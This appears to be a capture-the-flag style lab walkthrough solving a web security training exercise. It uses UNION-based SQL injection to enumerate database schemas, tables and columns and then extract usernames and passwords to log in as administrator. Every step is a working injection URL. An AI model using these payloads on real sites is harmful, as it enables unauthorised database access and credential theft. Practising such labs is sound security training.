# SQL injection attack, listing the database contents on non-Oracle databases

1. Send the following request to confirm the injection point

```
https://0a8200c503d6972c842eb5e200e900aa.web-security-academy.net/filter?category=Pets'+UNION+SELECT+null,'a'--+-
```

2. Send the following to list the schema

```
https://0a8200c503d6972c842eb5e200e900aa.web-security-academy.net/filter?category=Pets'+UNION+SELECT+null,schema_name+FROM+information_schema.schemata--+-
```

3. Get the table names with the following request

```
https://0a8200c503d6972c842eb5e200e900aa.web-security-academy.net/filter?category=Pets'+UNION+SELECT+null,table_name+FROM+information_schema.tables+WHERE+table_schema='public'--+-
```

![[attachments/sqli-lab-5/file-20260206135416484.png]]

4. Now use the following request to get the column names

```
https://0a8200c503d6972c842eb5e200e900aa.web-security-academy.net/filter?category=Pets'+UNION+SELECT+null,column_name+FROM+information_schema.columns+WHERE+table_name='users_kzkmxb'--+-
```

![[attachments/sqli-lab-5/file-20260206135416487.png]]

5. Send the following request to get the usernames and passwords

```
https://0a8200c503d6972c842eb5e200e900aa.web-security-academy.net/filter?category=Pets'+UNION+SELECT+username_asuavr,password_nznlbv+FROM+users_kzkmxb--+-
```

![[attachments/sqli-lab-5/file-20260206135416488.png]]

6. Log in as the administrator to solve the lab

